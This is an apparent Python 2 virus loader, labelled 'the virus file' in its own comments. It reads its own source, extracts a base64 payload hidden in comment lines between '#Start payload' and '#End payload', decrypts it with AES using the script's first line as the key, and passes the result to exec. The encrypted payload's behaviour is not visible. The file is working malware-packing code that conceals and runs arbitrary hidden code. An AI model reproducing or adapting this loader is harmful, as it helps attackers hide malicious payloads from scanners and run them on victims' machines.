print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"
print "bohohoo"
######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
#Start payload
#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
#End payload